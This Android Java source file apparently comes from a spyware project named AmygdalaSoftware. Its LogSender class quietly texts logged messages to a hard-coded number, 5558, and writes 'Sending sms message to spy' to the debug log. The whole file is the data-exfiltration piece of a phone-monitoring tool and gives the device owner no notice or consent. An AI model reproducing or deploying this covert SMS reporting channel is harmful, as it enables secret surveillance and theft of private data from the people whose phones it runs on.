package com.AmygdalaSoftware;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.util.Log;

public class LogSender {

	private static final String SEND_NUMBER = "5558";
	
	private static LogSender manager;
	
	private Context context;

	
	public static LogSender getInstance(Context context) {
		if(LogSender.manager == null) {
			LogSender.manager = new LogSender(context);
		}
		return LogSender.manager;
	}
	
	private LogSender(Context context) {
		this.context = context;
	}
	
	public void sendSms(String message) {
	    try {
	        SmsManager sms = SmsManager.getDefault();
	        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,new Intent("SMS_SENT"), 0);
	        sms.sendTextMessage(SEND_NUMBER, null, message, sentPI, null);
	        Log.d(LogSender.class.getName(), "Sending sms message to spy");
	    } catch (Exception e) {
	        e.printStackTrace();
	    }
	}
}
